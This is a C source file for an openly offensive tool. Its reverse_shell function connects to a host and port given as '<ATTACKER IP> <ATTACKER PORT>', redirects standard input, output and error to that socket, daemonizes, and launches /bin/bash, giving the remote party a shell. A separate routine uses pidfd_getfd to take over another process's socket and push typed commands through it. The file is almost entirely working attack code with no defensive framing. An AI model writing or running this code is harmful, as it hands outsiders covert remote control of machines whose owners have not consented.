#include "include/reverse_shell.h"




int pidfd_open(pid_t pid, unsigned int flags) 
{
    return syscall(SYS_pidfd_open, pid, flags);
}


int pidfd_getfd(int pidfd, int targetfd, unsigned int flags) 
{
    return syscall(SYS_pidfd_getfd, pidfd, targetfd, flags);
}




bool hijack_socket_connection(pid_t target_pid,int target_fd)
{
	int pidfd = pidfd_open(target_pid,0);
	if (pidfd < 0)
	{
		return_defer(pidfd_open_failed);
	}

	int sockfd = pidfd_getfd(pidfd,target_fd,0);
	if (sockfd < 0)
	{
		return_defer(pidfd_getfd_failed);
	}

	int flags = fcntl(sockfd,F_GETFL,0);
	fcntl(sockfd,F_SETFL,flags & ~O_NONBLOCK);

	#define TRUE 1
	while(TRUE)
	{
		char buf[4096] = {0};
		printf(" Enter command #>> ");
		fgets(buf,4096,stdin);
		send(sockfd,buf,strlen(buf),0);
		puts("");
	}

	close(sockfd);
	close(pidfd);


pidfd_getfd_failed:
	PRINT_DEBUG("pidfd_getfd : ");
	return_defer(failure);

pidfd_open_failed:
	PRINT_DEBUG("pidfd_open : ");

failure:
	return false;
}

bool daemonize(const char *dir_path)
{

	// fork() and kill parent
	
	#define C_CHILD_PROCESS 0
	
	int pid = fork();
	if (pid != C_CHILD_PROCESS)
	{
		exit(0);
	}

	// call setsid()
	setsid();

	// fork() and kil parent
	pid = fork();
	if(pid != C_CHILD_PROCESS)
	{
		exit(0);
	}

	
	// close unused fds

	if (dir_path != NULL)
	{
		// chroot()
		


		// chdir() to chroot dir
	}


	return true;
}


bool reverse_shell(char *host,char *service)
{
	// open tcp connection to the attacker server
	
	// create a tcp socket

	int client_fd = socket(AF_INET,SOCK_STREAM,0);
	if (client_fd == -1)
	{
		return_defer(socket_failed);
	}


	// fill the sockaddr structure the right way
	
	struct addrinfo hints,*result;
	
	memset(&hints,0,sizeof(hints));	
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;

	int status = getaddrinfo(host,service,&hints,&result);
	
	if (status != 0)
	{
		return_defer(getaddrinfo_failed);
	}


	// connect to the attacker machine
	
	status = connect(client_fd,result->ai_addr,result->ai_addrlen);
	if (status == -1)
	{
		return_defer(connect_failed);
	}




	// duplicate file descriptor (0 - stdin, 1 - stdout , 2 - stdout)
	#define C_STD_INPUT 0
	#define C_STD_OUTPUT 1
	#define C_STD_ERROR 2	
	
	dup2(client_fd,C_STD_INPUT);
	dup2(client_fd,C_STD_OUTPUT);
	dup2(client_fd,C_STD_ERROR);

	// make this a daemon

	daemonize(NULL);

	// spawn a shell program to replace the current binary
	
	
	char *const argvp[] = {"/bin/bash",NULL};
	
	execve("/bin/bash",argvp,environ);	

	return true;


connect_failed:
	PRINT_DEBUG("connect : ");
	return_defer(reverse_failed);


getaddrinfo_failed:
	PRINT_DEBUG("getaddrinfo : ");
	return_defer(reverse_failed);

socket_failed:
	PRINT_DEBUG("socket : ");

reverse_failed:
	return false;
}


int print_usage(char **argv)
{
	return printf("\t\n\n\tUsage :\n\t\t%s <ATTACKER IP> <ATTACKER PORT>\n\n\n",argv[0]);
}

int main(int argc,char **argv)
{
	if (argc < 3)
	{
		print_usage(argv);
		return_defer(main_failed);
	}

	reverse_shell(argv[1],argv[2]);	
	return 0;

main_failed:
	return -1;
}
